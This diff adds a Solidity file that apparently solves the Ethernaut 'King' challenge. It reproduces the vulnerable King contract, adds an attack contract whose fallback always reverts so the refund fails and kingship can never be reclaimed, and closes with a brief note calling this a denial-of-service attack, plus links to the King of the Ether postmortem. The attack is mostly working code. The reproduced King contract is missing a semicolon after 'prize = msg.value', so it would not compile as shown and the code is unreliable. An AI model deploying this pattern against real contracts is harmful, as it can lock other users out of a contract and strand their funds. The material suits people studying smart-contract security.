@@ -1,0 +1,61 @@
+pragma solidity ^0.5.0;
+
+contract King {
+
+  address payable king;
+  uint public prize;
+  address payable public owner;
+
+  constructor() public payable {
+    owner = msg.sender;
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  function() external payable {
+    require(msg.value >= prize || msg.sender == owner);
+    king.transfer(msg.value);
+    king = msg.sender;
+    prize = msg.value
+  }
+
+  function _king() public view returns (address payable) {
+    return king;
+  }
+}
+
+
+contract stopOwnership{
+
+    King public k;
+
+
+    function() external payable{
+
+       revert();
+
+    }
+
+    constructor(address payable _addr) public payable{
+
+        k = King(_addr);
+        address(k).call.value(msg.value)('');		//msg.value > contract.prize()
+
+    }
+
+}
+
+
+
+As we have a revert in our fallback, when the instance will send us back the money to reclain the ownership,
+the revert will throw the error and so the fallback of King contract will never execute the king.transfer
+and no one will be able to claim the ownership
+
+This is a DOS attack
+
+
+Further Reading:
+
+https://www.kingoftheether.com/thrones/kingoftheether/index.html
+
+http://www.kingoftheether.com/postmortem.html
